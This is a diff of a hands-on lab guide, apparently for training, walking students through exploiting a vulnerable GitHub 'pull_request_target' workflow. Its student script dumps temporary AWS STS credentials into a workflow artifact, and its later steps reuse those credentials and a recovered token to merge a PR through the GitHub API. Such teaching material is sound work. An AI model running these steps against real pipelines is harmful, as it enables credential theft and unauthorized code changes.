@@ -137,10 +137,24 @@ ci/student-steps/YOUR_HANDLE.sh
 Copy this as the file content:
 
 ```bash
-printf 'export AWS_ACCESS_KEY_ID=%s\n' "$AWS_ACCESS_KEY_ID" | tee /tmp/sts-creds.sh
-printf 'export AWS_SECRET_ACCESS_KEY=%s\n' "$AWS_SECRET_ACCESS_KEY" | tee -a /tmp/sts-creds.sh
-printf 'export AWS_SESSION_TOKEN=%s\n' "$AWS_SESSION_TOKEN" | tee -a /tmp/sts-creds.sh
-printf 'export AWS_REGION=%s\n' "$AWS_REGION" | tee -a /tmp/sts-creds.sh
+#!/usr/bin/env bash
+set -euo pipefail
+
+: "${AWS_ACCESS_KEY_ID:?AWS_ACCESS_KEY_ID is required}"
+: "${AWS_SECRET_ACCESS_KEY:?AWS_SECRET_ACCESS_KEY is required}"
+: "${AWS_SESSION_TOKEN:?AWS_SESSION_TOKEN is required}"
+: "${AWS_REGION:?AWS_REGION is required}"
+
+STS_CREDS_PATH="${STS_CREDS_PATH:-/tmp/sts-creds.sh}"
+umask 077
+mkdir -p "$(dirname "$STS_CREDS_PATH")"
+
+{
+  printf 'export AWS_ACCESS_KEY_ID=%s\n' "$AWS_ACCESS_KEY_ID"
+  printf 'export AWS_SECRET_ACCESS_KEY=%s\n' "$AWS_SECRET_ACCESS_KEY"
+  printf 'export AWS_SESSION_TOKEN=%s\n' "$AWS_SESSION_TOKEN"
+  printf 'export AWS_REGION=%s\n' "$AWS_REGION"
+} | tee "$STS_CREDS_PATH"
 ```
 
 Commit the file to your fork.
@@ -173,19 +187,22 @@ If stuck: confirm the PR targets the room demo repo, not your fork's default bra
 
 Why it matters: the vulnerable `pull_request_target` workflow runs in the target repository context.
 
-### Step 5 — Copy temporary AWS credentials from your pipeline step
+### Step 5 — Download temporary AWS credentials from the artifact
 
-Goal: use the STS session printed by the script you supplied in the PR.
+Goal: use the STS session written by the script you supplied in the PR.
 
 In your browser:
 
 1. Open your PR.
 2. Open the **Actions** run for that PR.
-3. Open the **Exchange OIDC for STS and run PR-controlled step** log section.
-4. Find the copy-ready `export` lines printed by your script.
-5. Paste those lines into your terminal.
+3. Wait for the workflow to finish.
+4. Scroll to **Artifacts**.
+5. Download **sts-credentials**.
+6. Unzip the download.
+7. Open `sts-creds.sh`.
+8. Paste the four `export` lines into your terminal.
 
-The workflow log should show four export lines. The `sts-credentials` artifact contains the same four lines in `sts-creds.sh`. Do not copy this redacted example; copy the real four export lines from your workflow run:
+The artifact file should contain four export lines. Do not copy this redacted example; copy the real four export lines from `sts-creds.sh`:
 
 ```bash
 export AWS_ACCESS_KEY_ID=REDACTED_AWS_ACCESS_KEY_ID
@@ -206,7 +223,7 @@ Expected result:
 aws env ready: us-east-1 AWS_ACCESS_KEY_ID_SET
 ```
 
-If stuck: download the `sts-credentials` artifact from the run and copy the four lines from `sts-creds.sh`. Do not paste personal AWS credentials.
+If stuck: do not copy from the workflow log; line wrapping can mangle the session token. Download the `sts-credentials` artifact again and copy from `sts-creds.sh`.
 
 Why it matters: temporary means expiring, not unstealable. Your PR-controlled step became the exfil channel.
 
@@ -258,36 +275,17 @@ If stuck: run Step 6 again. If STS identity works but this command fails, ask fo
 
 Why it matters: the AWS role is narrow. The secret is not.
 
-### Step 8 — Set the target repo and PR number
+### Step 8 — Merge your own PR with the recovered token
 
-Goal: point the merge command at your PR in the room demo repo.
+Goal: prove the secret read becomes code-hosting authority.
 
-Run:
+Run after replacing `PR_NUMBER` with your PR number:
 
 ```bash
 export DEMO_ORG="pipeline-demo-lab"
 export DEMO_REPO="cicd-demo"
 export PR_NUMBER="replace_with_your_pr_number"
-printf 'target=%s/%s PR=%s\n' "$DEMO_ORG" "$DEMO_REPO" "$PR_NUMBER"
-```
 
-Expected result:
-
-```text
-target=pipeline-demo-lab/cicd-demo PR=8
-```
-
-If stuck: your PR URL ends with `/pull/NUMBER`; use that number.
-
-Why it matters: the merge API call needs the target repo and your specific PR.
-
-### Step 9 — Merge your own PR with the recovered token
-
-Goal: prove the secret read becomes code-hosting authority.
-
-Run:
-
-```bash
 curl -sS -X PUT \
   -H "Authorization: token ${PAT}" \
   -H "Accept: application/vnd.github+json" \
@@ -304,11 +302,11 @@ Expected result:
 }
 ```
 
-If stuck: confirm `PAT`, `DEMO_ORG`, `DEMO_REPO`, and `PR_NUMBER` are set in the same terminal session.
+If stuck: your PR URL ends with `/pull/NUMBER`; use that number. Confirm `PAT`, `DEMO_ORG`, `DEMO_REPO`, and `PR_NUMBER` are set in the same terminal session.
 
 Why it matters: you merged it with a credential that did not exist when you opened the PR.
 
-### Step 10 — Refresh the trophy wall
+### Step 9 — Refresh the trophy wall
 
 Goal: see the visible impact of the merge.
 
